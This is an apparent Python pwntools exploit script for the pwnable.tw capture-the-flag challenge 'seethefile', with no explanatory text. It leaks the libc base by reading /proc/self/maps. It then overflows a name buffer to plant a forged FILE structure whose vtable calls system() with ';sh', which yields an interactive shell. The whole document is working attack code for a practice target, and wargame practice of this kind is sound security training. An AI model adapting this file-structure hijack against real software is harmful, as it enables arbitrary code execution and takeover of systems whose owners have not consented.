from pwn import *

def openfile(filename):
    p.recvuntil(b':')
    p.sendline(b'1')
    p.recvuntil(b':')
    p.sendline(filename)

def readfile():
    p.recvuntil(b':')
    p.sendline(b'2')

def show():
    p.recvuntil(b':')
    p.sendline(b'3')

def closefile():
    p.recvuntil(b':')
    p.sendline(b'4')

def exit(msg):
    p.recvuntil(b':')
    p.sendline(b'5')
    p.recvuntil(b':')
    p.sendline(msg)

context.arch = 'i386'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = remote('chall.pwnable.tw', 10200)
#p = process('./seethefile')
elf = ELF('./seethefile')
libc = ELF('./libc_32.so.6')

name = elf.symbols['name']
fp = elf.symbols['fp']

openfile(b'/proc/self/maps')
readfile()
readfile()
show()
p.recvline()
libc_base = int(p.recvline()[:8], 16)
closefile()
print('libc base:', hex(libc_base))
libc.address = libc_base
system = libc.symbols['system']

fakefile_addr = fp + 0x4
fakefile = (p32(0xffffdfff) + b';sh\x00').ljust(0x94, b'\x00')
fakefile += p32(fakefile_addr + 0x98)
fakefile += p32(0) * 0x2 + p32(system)

exit(b'a' * 0x20 + p32(fakefile_addr) + fakefile)

p.interactive()
